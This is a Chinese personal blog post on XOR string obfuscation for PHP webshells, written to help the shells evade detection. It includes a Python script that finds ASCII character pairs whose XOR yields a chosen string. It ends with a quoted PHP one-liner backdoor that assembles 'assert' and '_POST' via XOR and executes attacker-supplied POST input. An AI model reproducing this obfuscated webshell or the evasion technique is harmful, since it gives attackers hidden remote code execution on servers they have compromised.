---
title: Python string XOR
tags:
  - 学习
  - Python
categories:
  - 编程语言
copyright: true
abbrlink: b5a2e443
date: 2019-01-19 23:40:16
---

![](https://ae01.alicdn.com/kf/HTB15q1hawaH3KVjSZFjq6AFWpXau.jpg)
<!--more-->

这几天即刻群里的师傅们都讨论PHP shell如何改装从而存活下来，由于自己太菜只能，默默的听大佬们讨论不敢吱声 ~ Orz
听大佬们讨论，什么用`fopen`加载txt里php，`xor`Str 然后组合之类，听得我一脸懵逼的 0.0  特别是`xor`,完全不知道那是什么，去查了下php的手册，看完后对于php烂成没模样的我来说更加懵逼了~
后面在九世表哥的Blog翻到一篇 [**No character shell study**](https://422926799.github.io/2019/01/18/No-character-shell-study/) 

![](https://ae01.alicdn.com/kf/HTB1qSShaEuF3KVjSZK9q6zVtXXay.jpg)

>异或运算是指，取每个字符的ASCII，转成二进制再做运算，运二进制算结果转成ASCII，然后再转成字符串

看到这个，才算数明白了些。但是，怎么知道哪些字符串进行异或运算后会得到我想要的新的字符串呢？于是Google了一波，找到了【通过查ASCII表的符合和字符的异或，打印出所有可能的组合】的py脚本，把轮子扣下来小小修改了一下，唔，very good，这就是我想要的。
<!--more-->
代码如下：

```python
# -*- coding: utf-8 -*-

str1_AScII = range(32, 127)
str2_AScII = range(32, 127)
result_ASCII = range(32, 127)
print("[-] Waiting for create the dicts...")
dict_key = []
dict_value = []

for i in str1_AScII:
    for j in str2_AScII:
        if i ^ j in result_ASCII:
            dict_key.append((i, j, chr(i), chr(j)))
            dict_value.append(chr(i ^ j))

dicts = dict(zip(dict_key, dict_value))
print("[+] OK,The dicts is create")

YourStr = input("[-] Enter the string to be XORed: ")
print("\n[-] YourStr is : %s\n" % (YourStr))

for i in YourStr:
    count = 5
    print("============ " + "[" + i + "]" + " Can following composition ========")
    for k, v in dicts.items():
        if count != 0: # 只遍历输出前五个异或结果
            if v == "%s" % i:
                if (k[0] in result_ASCII) and (k[1] in result_ASCII):
                    print('"%s" ^ "%s"' % (k[2], k[3]))
                    count -= 1
            else:
                continue

```

![](https://ae01.alicdn.com/kf/HTB1A5ihavWG3KVjSZFg762TspXa6.png)

然后开始看着轮子造轮子。

然而，想造个好点的轮子，php太菜了弄了半天没弄出来，就弄了个最简单的一句话`xor` （晕）。。。。。。。

这里有个bug，拿九世表哥的造的小马，在本地环境上居然跑不起来，PHP直接是报错的。。。从此对php的好感又降了一级。 :P不知道是不是环境的问题，等后面再看了。

附上九世表哥的：

```php 
<?php
$_0 = ("!"^"@").("3"^"@").("3"^"@").("%"^"@").("2"^"@").("4"^"@"); /*assert*/
$_1 = '_'.(hex2bin("10")^"@").(hex2bin("0F")^"@").(hex2bin("13")^"@").(hex2bin("14")^"@");
$_2 = $$_1;
$_0($_2[_]);
?>
```